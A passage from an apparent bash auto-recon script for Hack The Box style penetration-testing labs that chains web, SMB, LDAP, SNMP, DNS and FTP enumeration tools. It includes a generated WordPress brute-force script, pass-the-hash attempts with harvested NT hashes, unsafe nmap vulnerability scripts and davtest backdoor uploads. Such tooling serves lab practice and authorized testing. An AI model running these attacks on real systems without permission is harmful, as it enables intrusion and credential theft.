            echo -e "${DOPE} sublist3r.py -d $domainName -o $reconDir/subdomains-$rhost-$port-$domainName.log"
            cd /opt/Sublist3r && python3 sublist3r.py -d $domainName -o $reconDir/subdomains-$rhost-$port-$domainName.log
            cd - &>/dev/null
            echo -e "${DOPE} subfinder -d $domainName -o "$domainName"-subfinder.log"
            subfinder -d $domainName -o "$domainName"-subfinder.log
            echo -e "${DOPE} gobuster dns -d $domainName -w /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt -t 80 -o gobust-$domainName.log"
            gobuster dns -d $domainName -w /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt -t 80 -o gobust-$domainName.log
        fi
    fi
    if [[ -n "$domainName" ]] && [[ $domainName != "localhost" ]]; then
        unset rhost
        rhost=$domainName
    else
        :
    fi
}

Enum_Web_SSL() {
    grep -E 'https|ssl/http|ssl/unknown' top-open-services.txt | cut -d "/" -f 1 >openportsSSL-$rhost.txt
    if [[ -s openportsSSL-$rhost.txt ]]; then
        portfilenameSSL=openportsSSL-$rhost.txt
        # echo $portfilenameSSL
        httpPortsLinesSSL=$(cat $portfilenameSSL)
        cwd=$(pwd)
        for port in $httpPortsLinesSSL; do
            set -- $port
            wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt"
            wordlist2="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            wordlist4="/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
            echo -e "${DOPE} Running The Following Commands"
            echo -e "${DOPE} sslscan https://$rhost:$port | tee sslscan-$rhost-$port.log"
            sslscan https://$rhost:$port | tee sslscan-color-$rhost-$port.log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" sslscan-color-$rhost-$port.log >sslscan-$rhost-$port.log
            rm sslscan-color-$rhost-$port.log
            ssl_dns_enum
            echo -e "${DOPE} whatweb -v -a 3 https://$rhost:$port | tee whatweb-color-$rhost-$port.log"
            whatweb -v -a 3 https://$rhost:$port | tee whatweb-color-$rhost-$port.log
            # Removing color from output log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$rhost-$port.log >whatweb-ssl-$rhost-$port.log && rm whatweb-color-$rhost-$port.log
            echo -e "${DOPE} Checking for Web Application Firewall... wafw00f https://$rhost:$port/"
            wafw00f https://$rhost:$port/ | tee wafw00f-color-$rhost-$port.log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" wafw00f-color-$rhost-$port.log >wafw00f-$rhost-$port.log
            rm wafw00f-color-$rhost-$port.log
            echo -e "${DOPE} curl -sSik https://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt"
            curl -sSik https://$rhost:$port/robots.txt -m 10 -o robots-$rhost-$port.txt &>/dev/null
            ############## EYE-WITNESS ##########################################
            mkdir -p eyewitness-report-"$rhost"-"$port" && cd /opt/EyeWitness
            echo https://"$rhost":"$port" >eyefile.txt
            echo -e "${DOPE} ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port"
            ./EyeWitness.py --threads 5 --ocr --no-prompt --active-scan --all-protocols --web -f eyefile.txt -d $cwd/eyewitness-report-$rhost-$port
            cd - &>/dev/null
            echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u https://$rhost:$port -t 80 -e php,asp,aspx,txt,html -f -x 403 --plain-text-report SSL-dirsearch-$rhost-$port.log"
            python3 /opt/dirsearch/dirsearch.py -u https://$rhost:$port -t 80 -e php,asp,aspx,txt -f -x 403 --plain-text-report SSL-dirsearch-$rhost-$port.log
            echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u https://$rhost:$port -t 80 -e php,asp,aspx,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403 --plain-text-report SSL-dirsearch-dlistmedium-$rhost-$port.log"
            python3 /opt/dirsearch/dirsearch.py -u https://$rhost:$port -t 80 -e php,asp,aspx,txt,html -w $wordlist2 -x 403 --plain-text-report SSL-dirsearch-dlistmedium-$rhost-$port.log
            echo -e "${DOPE} Running nikto as a background process to speed things up"
            echo -e "${DOPE} nikto -ask=no -host https://$rhost:$port -ssl >niktoscan-$rhost-$port.txt 2>&1 &"
            nikto -ask=no -host https://$rhost:$port -ssl >niktoscan-$rhost-$port.txt 2>&1 &
            # uniscan -u https://$rhost:$port -qweds
            echo -e "${DOPE} Further Web enumeration Commands to Run: "
            echo -e "${MANUALCMD} uniscan -u https://$rhost:$port -qweds" | tee -a manual-commands.txt
            # echo -e "${MANUALCMD} gobuster dir -u https://$rhost:$port -w $wordlist2 -l -t 80 -x .html,.php,.asp,.aspx,.txt -e -k" | tee -a manual-commands.txt

            if [ $(grep -i "WordPress" whatweb-ssl-$rhost-$port.log 2>/dev/null) ]; then
                echo -e "${DOPE} Found WordPress! Running wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee wpscan2-$rhost-$port.log"
                wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-content --enumerate vp,vt,cb,dbe,u,m --plugins-detection aggressive | tee wpscan2-$rhost-$port.log
                sleep 1
                echo -e "${DOPE} Creating manual brute force script!"
                cat >wordpressBrute.sh <<EOF
#!/bin/bash

if [[ -n \$(grep -i "User(s) Identified" wpscan2-$rhost-$port.log) ]]; then
    grep -w -A 100 "User(s)" wpscan2-$rhost-$port.log | grep -w "[+]" | cut -d " " -f 2 | head -n -7 >wp-users2.txt
    # create wordlist from web-page with cewl
    cewl https://$rhost:$port/ -m 3 -w cewl-list2.txt
    sleep 10
    # add john rules to cewl wordlist
    echo "Adding John Rules to Cewl Wordlist!"
    john --rules --wordlist=cewl-list2.txt --stdout >john-cool-list2.txt
    sleep 3
    # brute force again with wpscan
    wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users2.txt -P cewl-list.txt threads 50 | tee wordpress-cewl-brute2.txt
    sleep 1
    if grep -i "No Valid Passwords Found" wordpress-cewl-brute2.txt; then
        if [ -s john-cool-list2.txt ]; then
            wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users2.txt -P john-cool-list2.txt threads 50 | tee wordpress-john-cewl-brute2.txt
        else
            echo "John wordlist is empty :("
        fi
        # if password not found then run it again with fasttrack.txt
        sleep 1
        if grep -i "No Valid Passwords Found" wordpress-john-cewl-brute2.txt; then
            wpscan --no-update --disable-tls-checks --url https://$rhost:$port/ --wp-content-dir wp-login.php -U wp-users2.txt -P /usr/share/wordlists/fasttrack.txt threads 50 | tee wordpress-fasttrack-brute2.txt
        fi
    fi
fi
EOF
                chmod +x wordpressBrute.sh
            elif grep -i "Drupal" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Drupal! Running droopescan scan drupal -u https://$rhost -t 32 | tee drupalscan-$rhost-$port.log"
                droopescan scan drupal -u https://$rhost:$port/ -t 32 | tee -a drupalscan.log
            elif grep -i "Joomla" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Joomla! Running joomscan --url https://$rhost/ -ec | tee joomlascan-$rhost-$port.log"
                joomscan --url https://$rhost:$port/ -ec | tee -a joomlascan-$rhost-$port.log
            elif grep -i "WebDAV" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found WebDAV! Running davtest -move -sendbd auto -url https://$rhost:$port/ | tee davtestscan-$rhost-$port.log"
                davtest -move -sendbd auto -url https://$rhost:$port/ | tee -a davtestscan-$rhost-$port.log
            elif grep -i "magento" whatweb-ssl-$rhost-$port.log 2>/dev/null; then
                echo -e "${DOPE} Found Magento! Running /opt/magescan/bin/magescan scan:all --insecure https://$rhost/ | tee magescan-$rhost-$port.log"
                cd /opt/magescan
                bin/magescan scan:all -n --insecure https://$rhost:$port/ | tee magento-$rhost-$port.log
                cd - &>/dev/null
                echo -e "${DOPE} Consider crawling site: python3 /opt/dirsearch/dirsearch.py -u https://$rhost:$port -w /usr/share/seclists/Discovery/Web-Content/CMS/sitemap-magento.txt -e php,asp,aspx,txt,html -t 80 -x 403,401,404,500 --plain-text-report dirsearch-magento-$rhost-$port.log"
            else
                :
            fi
        done
        if [[ -n $redirect_domain ]]; then
            unset rhost
            rhost=${arg[1]}
        elif [[ -n $domainName ]]; then
            unset rhost
            rhost=${arg[1]}
        else
            :
        fi
        if [[ -s domains.txt ]]; then
            urldomains2=$(cat domains.txt)
            for urldomain2 in $urldomains2; do
                echo "https://$urldomain2" >>aquaurls2.txt
            done
        fi
        if [[ -s aquaurls2.txt ]]; then
            urlSSLPorts2=$(cat openportsSSL-$rhost.txt | tr '\n' ',')
            formattedSSLUrlPorts2=$(echo "${urlSSLPorts2::-1}")
            cat aquaurls2.txt | sort -u | aquatone -ports $formattedSSLUrlPorts2 -out dns_aquatone
        fi
    fi
}

ftp_scan() {
    grep -w "ftp" top-open-services.txt | cut -d "/" -f 1 >openportsFTP-$rhost.txt
    portfilenameFTP=openportsFTP-$rhost.txt
    # echo $portfilenameSSL
    PortsLinesFTP=$(cat $portfilenameFTP)
    if [[ -s openportsFTP-$rhost.txt ]]; then
        for ftp_port in $PortsLinesFTP; do
            echo -e "${DOPE} Running nmap ftp script scan on port: $ftp_port"
            nmap -sV -Pn -p $ftp_port --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-syst -v -oA nmap/ftp-enum $rhost
        done
    fi
}

smtp_enum() {
    grep -i "smtp" top-open-services.txt | cut -d "/" -f 1 >openportsSMTP-$rhost.txt
    portfilenameSMTP=openportsSMTP-$rhost.txt
    # echo $portfilenameSSL
    PortsLinesSMTP=$(cat $portfilenameSMTP)
    if [[ -s openportsSMTP-$rhost.txt ]]; then
        for smtp_port in $PortsLinesSMTP; do
            echo -e "${DOPE} Found SMTP! ENUMERATING USERS"
            echo -e "${DOPE} smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $rhost -p $smtp_port 2>&1 | tee smtp-users-$rhost-$smtp_port.log"
            smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $rhost -p $smtp_port 2>&1 | tee smtp-users-$rhost-$smtp_port.log
        done
    fi
}

rpc_enum() {
    if [[ $(grep -E "msrpc|rpcbind|erpc" top-open-services.txt) ]]; then
        if [[ ! -s smb-scan-$rhost.log ]]; then
            echo -e "${DOPE} Found RPC!" | tee -a rpc-color-scan-$rhost.log
            echo -e "${DOPE} enum4linux -av $rhost" | tee -a rpc-color-scan-$rhost.log
            enum4linux -av $rhost | tee -a rpc-color-scan-$rhost.log
            sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" rpc-color-scan-$rhost.log >rpc-scan-$rhost.log
            if type -p impacket-rpcdump >/dev/null; then
                echo -e "${DOPE} impacket-rpcdump @$rhost"
                impacket-rpcdump @$rhost >>rpc-scan-$rhost.log
            fi
            rm rpc-color-scan-$rhost.log
        fi
    fi
}

ldap_enum() {
    if [[ $(grep -w "ldap" top-open-services.txt) ]] || [[ $(grep -w "389" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found LDAP! Running nmap ldap scripts"
        echo -e "${DOPE} nmap -vv -Pn -sV -p 389 --script='(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' -oA nmap/ldap-$rhost $rhost"
        nmap -vv -Pn -sV -p 389 --script='(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)' -oA nmap/ldap-$rhost $rhost
        echo -e "${DOPE} ldapsearch -x -h $rhost -s base namingcontexts"
        ldapsearch -x -h $rhost -s base namingcontexts | tee ldap-namingcontexts-$rhost.log
        dcList=$(sed -n -e 's/^.*namingContexts: //p' ldap-namingcontexts-$rhost.log)
        # dcList=$(sed -n -e 's/^.*namingContexts: //p' ldap-namingcontexts-$rhost.log | tr ',' '\n' | cut -d '=' -f 2)
        echo -e "${DOPE} ldapsearch -x -h $rhost -s base -b $dcList"
        ldapsearch -x -h $rhost -s base -b $dcList | tee ldap-base-$rhost.log
        echo -e "${DOPE} ldapsearch -x -h $rhost -s sub -b $dcList"
        ldapsearch -x -h $rhost -s sub -b $dcList | tee ldap-sub-$rhost.log
        ldapUserNames=$(sed -n -e 's/^.*uid=//p' nmap/ldap-$rhost.nmap | cut -d ',' -f 1)
        sambaNTPassword=$(sed -n -e 's/^.*sambaNTPassword: //p' nmap/ldap-$rhost.nmap)
        ldapUserPasswords=$(sed -n -e 's/^.*userPassword: //p' nmap/ldap-$rhost.nmap)

        sortUsers() {
            for user in $ldapUserNames; do
                if [[ -n $sambaNTPassword ]]; then
                    if (($(grep -c . <<<"$sambaNTPassword") > 1)); then
                        for hash in $sambaNTPassword; do
                            echo -e "${DOPE} smbmap -u $user -p "$hash:$hash" -H $rhost -R"
                            smbmap -u $user -p "$hash:$hash" -H $rhost -R
                        done
                    else
                        echo -e "${DOPE} smbmap -u $user -p "$sambaNTPassword:$sambaNTPassword" -H $rhost -R"
                        smbmap -u $user -p "$sambaNTPassword:$sambaNTPassword" -H $rhost -R
                    fi
                fi
            done
        }
        sortUsers
        if [[ ! -s smb-scan-$rhost.log ]]; then
            echo -e "${DOPE} Found LDAP! Running Enum4Linux"
            enum4linux -a -l -v $rhost | tee ldapenum-$rhost.txt
        fi
    fi
    if ! grep -q "389" top-open-ports.txt; then
        grep -v "filtered" nmap/udp-$rhost.nmap | grep "open" | cut -d "/" -f 1 >udp-scan2-$rhost.txt
        if grep -q "137" udp-scan2-$rhost.txt; then
            if [[ ! -s smb-scan-$rhost.log ]]; then
                echo -e "${DOPE} Found LDAP UDP port! Running Enum4Linux"
                enum4linux -a -M -l -d $rhost | tee ldapenum-$rhost.txt
                rm udp-scan2-$rhost.txt
            fi
        else
            rm udp-scan2-$rhost.txt
        fi
    fi

}

cups_enum() {
    if [[ $(grep -w "ipp" top-open-services.txt) ]] || [[ $(grep -w "631" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found ipp cups Running nmap command:"
        echo -e "${DOPE} nmap -v -sV -Pn --script=cups-info.nse,cups-queue-info.nse -p 631 -oA nmap/cups-enum-$rhost $rhost"
        nmap -v -sV -Pn --script=cups-info.nse,cups-queue-info.nse -p 631 -oA nmap/cups-enum-$rhost $rhost
    fi
}

nfs_enum() {
    grep -w "rpcbind" top-open-services.txt | cut -d "/" -f 1 >openports-nfs.txt
    if grep -q "111" openports-nfs.txt; then
        echo -e "${DOPE} nmap -v -sV -Pn -p 111 --script=nfs-ls.nse,nfs-statfs.nse,nfs-showmount.nse -oA nmap/nfs-$rhost $rhost"
        nmap -v -sV -Pn -p 111 --script=nfs-ls.nse,nfs-statfs.nse,nfs-showmount.nse -oA nmap/nfs-$rhost $rhost
        showmount -e $rhost 2>&1 | tee nfs-showmount-$rhost.txt
    fi
}

java_rmi_scan() {
    if [[ $(grep -w "rmiregistry" top-open-services.txt) ]] || [[ $(grep -w "1099" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found Java-Rmi-Registry! Running nmap command:"
        echo -e "${DOPE} nmap -v -sV -Pn --script=rmi-vuln-classloader.nse -p 1099 -oA nmap/java-rmi-$rhost $rhost"
        nmap -v -sV -Pn --script=rmi-vuln-classloader.nse -p 1099 -oA nmap/java-rmi-$rhost $rhost
    fi
    if [[ $(grep -w "java-rmi" top-open-services.txt) ]] || [[ $(grep -w "1100" top-open-ports.txt) ]]; then
        echo -e "${DOPE} Found Java-RMI! Running nmap command:"
        echo -e "${DOPE} nmap -v -sV -Pn --script=rmi-vuln-classloader.nse -p 1099 -oA nmap/java-rmi-$rhost $rhost"
        nmap -v -sV -Pn --script=rmi-dumpregistry.nse -p 1099 -oA nmap/java-rmi-dump-$rhost $rhost
    fi

}

Intense_Nmap_UDP_Scan() {
    printf "\e[93m################### RUNNING NMAP TOP UDP PORTS ##################################################### \e[0m\n"
    echo -e "${DOPE} nmap -sUV -v --reason -T4 --max-retries 3 --max-rtt-timeout 150ms -pU:53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,998,1434,1701,1900,4500,5353,49152,49154 -oA nmap/udp-$rhost $rhost"
    nmap -sUV -v --reason -T4 --max-retries 3 --max-rtt-timeout 150ms -pU:53,67-69,111,123,135,137-139,161-162,445,500,514,520,631,998,1434,1701,1900,4500,5353,49152,49154 -oA nmap/udp-$rhost $rhost
}

Enum_SMB() {
    if [[ $(grep -i "netbios-ssn" top-open-services.txt) ]] || [[ $(grep -i "microsoft-ds" top-open-services.txt) ]]; then
        echo -e "${DOPE} Found Samba!" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} Running SMBCLIENT, Checking shares" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbclient -L //$rhost -U 'guest'%" | tee -a smb-color-scan-$rhost.log
        smbclient -L //$rhost -U "guest"% | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running ENUM4LINUX" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} enum4linux -av $rhost" | tee -a smb-color-scan-$rhost.log
        enum4linux -av $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running NMBLOOKUP" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} nmblookup -A $rhost" | tee -a smb-color-scan-$rhost.log
        nmblookup -A $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running All SMB nmap Vuln / Enum checks" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} nmap -vv -sV -Pn -p139,445 --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse --script-args=unsafe=1 -oA nmap/smbvulns-$rhost $rhost" | tee -a smb-color-scan-$rhost.log
        nmap -vv -sV -Pn -p139,445 --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse --script-args=unsafe=1 -oA nmap/smbvulns-$rhost $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running NBTSCAN" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} nbtscan -rvh $rhost" | tee -a smb-color-scan-$rhost.log
        nbtscan -rvh $rhost | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} Running smbmap" | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbmap -H $rhost" | tee -a smb-color-scan-$rhost.log
        smbmap -H $rhost | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbmap -H $rhost -R" | tee -a smb-color-scan-$rhost.log
        smbmap -H $rhost -R | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbmap -u null -p '' -H $rhost" | tee -a smb-color-scan-$rhost.log
        smbmap -u null -p "" -H $rhost | tee -a smb-color-scan-$rhost.log
        echo -e "${DOPE} smbmap -u null -p '' -H $rhost -R" | tee -a smb-color-scan-$rhost.log
        smbmap -u null -p "" -H $rhost -R | tee -a smb-color-scan-$rhost.log

        echo -e "${DOPE} All checks completed Successfully" | tee -a smb-color-scan-$rhost.log
        sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" smb-color-scan-$rhost.log >smb-scan-$rhost.log
        rm smb-color-scan-$rhost.log
    fi
}

Enum_SNMP() {
    cwd=$(pwd)
    # echo $cwd
    cd $cwd
    if grep -q "199" top-open-ports.txt; then
        printf "\e[93m################### RUNNING SNMP-ENUMERATION ################################################################# \e[0m\n"

        echo -e "${DOPE} Running: onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log "
        onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log
        echo -e "${DOPE} Running: snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log "
        # echo -e "${DOPE} Running: snmp-check -c public -v 2 -d $rhost | tee -a snmpenum-scan.log "
        snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log
        # apt install snmp-mibs-downloader  # then comment out mibs : in /etc/snmp/snmp.conf
        if grep -q "timeout" snmpenum-$rhost.log; then
            echo -e "${DOPE} SNMP version 1 timed-out. Trying version 2."
            echo -e "${DOPE} snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log"
            snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log
        else
            :
        fi
    fi
    if ! grep -q "199" top-open-ports.txt; then
        grep -v "filtered" nmap/udp-$rhost.nmap | grep "open" | cut -d "/" -f 1 >udp-scan-$rhost.txt
        if grep -q "161" udp-scan-$rhost.txt; then
            printf "\e[93m################### RUNNING SNMP-ENUMERATION ############################################################# \e[0m\n"

            echo -e "${DOPE} Running: onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log "
            onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $rhost | tee -a snmpenum-$rhost.log
            echo -e "${DOPE} Running: snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log "
            # echo -e "${DOPE} Running: snmp-check -c public -v 2 -d $rhost | tee -a snmpenum-scan.log "
            snmp-check -c public -v 1 -d $rhost | tee -a snmpenum-$rhost.log
            # apt install snmp-mibs-downloader  # then comment out mibs : in /etc/snmp/snmp.conf
            lines_output=$(cat snmpenum-$rhost.log | wc -l)
            if [[ $(grep -i "timeout" snmpenum-$rhost.log) ]] || [[ $lines_output -lt 40 ]]; then
                echo -e "${DOPE} SNMP version 1 timed-out or didn't output enough information. Trying version 2."
                echo -e "${DOPE} snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log"
                snmpwalk -c public -v2c $rhost | tee -a snmpenum-$rhost.log
            else
                :
            fi

        fi
    fi

}

FULL_TCP_GOOD_MEASUERE_VULN_SCAN() {
    cwd=$(pwd)
    echo -e "${DOPE} Running Full Nmap TCP port Scan"
    echo -e "${DOPE} nmap -vv -Pn -A -p- -T4 --script-timeout 2m -oA nmap/full-tcp-scan-$rhost $rhost"
    nmap -vv -Pn -A -p- -T4 --script-timeout 2m -oA nmap/full-tcp-scan-$rhost $rhost
    echo -e "${YELLOW}#################################################################################################### ${END}"
    echo -e "${TEAL}########################### Checking Vulnerabilities  ############################################## ${END}"
    echo -e "${YELLOW}#################################################################################################### ${END}"
    cd /opt/ReconScan && python3 vulnscan.py $cwd/nmap/full-tcp-scan-$rhost.xml
    cd - &>/dev/null
}

dnsCheckHTB() {
    if grep -q ".htb" nmap/full-tcp-scan-$rhost.nmap; then
        htbdomains=$(grep "htb" nmap/full-tcp-scan-"$rhost".nmap | sed -n -e "s/^.*commonName=//p" | cut -d "/" -f 1 | sort -u)
        htbdomains2=$(grep "htb" nmap/full-tcp-scan-"$rhost".nmap | sed -n -e "s/^.*Name: //p" | sort -u)
        htbdomains8=$(sed -n -e 's/^.*Domain: //p' nmap/full-tcp-scan-"$rhost".nmap | cut -d ',' -f 1 | sort -u)
        htbdomains3=$(grep "htb" nmap/full-tcp-scan-"$rhost".nmap | sed 's/^.*| Subject Alternative Name: //p' | sed 's/, DNS:/ /g' | sed -n -e 's/^.*DNS://p' | sort -u)
        htbdomains6=$(grep -i ".htb" nmap/full-tcp-scan-"$rhost".nmap | grep -v "SF" | sed -n -e "s/^.*http://p" | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" | sort -u)
        htbdomains4=$(echo -e "$htbdomains\n$htbdomains2\n$htbdomains3\n$htbdomains6\n$htbdomains8" | grep -v "DNS:" | tr ' ' '\n')
        for htbdomain in $htbdomains4; do
            if [[ -n $htbdomain ]] && [[ $htbdomain == *"htb"* ]]; then
                if [[ $htbdomain == *"www."* ]]; then
                    echo $htbdomain >/tmp/www-$htbdomain.txt
                    wwwRemoved=$(sed -n -e 's/^.*www.//p' /tmp/www-$htbdomain.txt)
                    if grep -q "$rhost" /etc/hosts; then
                        if [[ $rhost == 127.0.0.1 ]]; then
                            :
                        elif grep -e "$rhost.*$wwwRemoved" /etc/hosts; then
                            :
                        else
                            echo -e "${DOPE} adding $wwwRemoved to hosts file"
                            sed -i $"/$rhost/ s/$/\t$wwwRemoved/" /etc/hosts
                        fi
                    else
                        echo -e "${DOPE} adding $wwwRemoved to hosts file"
                        sed -i $"3i$rhost\t$wwwRemoved" /etc/hosts
                    fi
                fi
                if grep -q "$rhost" /etc/hosts; then
                    if [[ $rhost == 127.0.0.1 ]]; then
                        :
                    elif grep -e "$rhost.*$htbdomain" /etc/hosts; then
                        :
                    else
                        echo -e "${DOPE} adding $htbdomain to hosts file"
                        sed -i $"/$rhost/ s/$/\t$htbdomain/" /etc/hosts
                    fi
                else
                    sed -i $"3i$rhost\t$htbdomain" /etc/hosts
                fi
            fi
        done
    fi
    portfilename=httpports-$rhost.txt
    httpPortsLines2=$(cat $portfilename)
    if [[ -s httpports-$rhost.txt ]]; then
        for port1 in $httpPortsLines2; do
            curl -sSik http://$rhost:$port1 -m 10 -o homepage-source2.html &>/dev/null
            if [[ -s homepage-source2.html ]]; then
                if grep -q ".htb" homepage-source2.html; then
                    htbsourcedomains=$(grep '.htb' homepage-source2.html | tr ' ' '\n' | grep ".htb" | sed -e "s/[^/]*\/\/\([^@]*@\)\?\([^:/]*\).*/\2/" | sort -u)
                    for htbsourcedomain in $htbsourcedomains; do
                        if [[ -n $htbsourcedomain ]]; then
                            if grep -q "$rhost" /etc/hosts; then
                                if grep -q "$htbsourcedomain" /etc/hosts; then
                                    :
                                else
                                    echo -e "adding $htbsourcedomain to hosts file"
                                    sed -i $"/$rhost/ s/$/\t$htbsourcedomain/" /etc/hosts
                                fi
                            else
                                sed -i $"3i$rhost\t$htbsourcedomain" /etc/hosts
                            fi
                        fi
                    done
                fi
            fi
            if [[ $rhost == 127.0.0.1 ]]; then
                :
            elif grep -q "$rhost" /etc/hosts; then
                htbdomains5=$(grep $rhost /etc/hosts | awk '{$1= ""; print $0}')
                remwildcardDomains=$(echo $htbdomains5 | tr ' ' '\n')
                for wcDomain in $remwildcardDomains; do
                    wildcards=('*' '?' '|')
                    for wildcard in "${wildcards[@]}"; do
                        if [[ $wcDomain == *"${wildcard}"* ]]; then
                            :
                        else
                            domainNoWildcard2=$(echo "${wcDomain#'*.'}")
                            echo $domainNoWildcard2 | tee -a htbdomainslist.txt
                        fi
                    done
                done
                htbdomains7=$(cat htbdomainslist.txt | sort -u)
                if [[ -s htbdomainslist.txt ]]; then
                    for htbdomain2 in $htbdomains7; do
                        if [[ $(grep "domain" top-open-services.txt) ]] || [[ $(grep -w "53" top-open-ports.txt) ]]; then
                            if [[ $htbdomain2 == *"www."* ]]; then
                                noWwwDomain=$(sed -n -e 's/^.*www.//p' htbdomainslist.txt | head -n 1)
                                echo -e "${DOPE} host -l $noWwwDomain $htbdomain2"
                                host -l $noWwwDomain $htbdomain2 | tee -a hostlookup-$rhost-$noWwwDomain.log
                                echo -e "${DOPE} dnsenum --dnsserver $rhost --enum  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $noWwwDomain"
                                dnsenum --dnsserver $rhost --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $noWwwDomain | tee -a dsnenum-$rhost-$noWwwDomain.log
                                if [[ -s fierce-$rhost-$noWwwDomain.log ]]; then
                                    :
                                else
                                    echo -e "${DOPE} fierce.py --domain $noWwwDomain --dns-servers $rhost"
                                    fierce.py --domain $noWwwDomain --dns-servers $rhost | tee fierce-$rhost-$noWwwDomain.log
                                fi
                            else
                                if [[ -s fierce-$rhost-$noWwwDomain.log ]]; then
                                    :
                                else
                                    baseDomain=$(cat htbdomainslist.txt | sed 's/.*\.\(.*\..*\)/\1/' | sort -u)
                                    if [[ -n $baseDomain ]]; then
                                        for uniqBaseDomain in $baseDomain; do
                                            echo -e "${DOPE} dnsenum --dnsserver $rhost --enum  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $uniqBaseDomain"
                                            dnsenum --dnsserver $rhost --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r $uniqBaseDomain | tee -a dsnenum-$rhost-$uniqBaseDomain.log
                                            if [[ -s fierce-$rhost-$uniqBaseDomain.log ]]; then
                                                :
                                            else
                                                echo -e "${DOPE} fierce.py --domain $uniqBaseDomain --dns-servers $rhost"
                                                fierce.py --domain $uniqBaseDomain --dns-servers $rhost | tee fierce-$rhost-$uniqBaseDomain.log
                                            fi
                                        done
                                    fi
                                fi
                            fi

                        fi
                        echo -e "${MANUALCMD} Manual Command to Run: wfuzz "
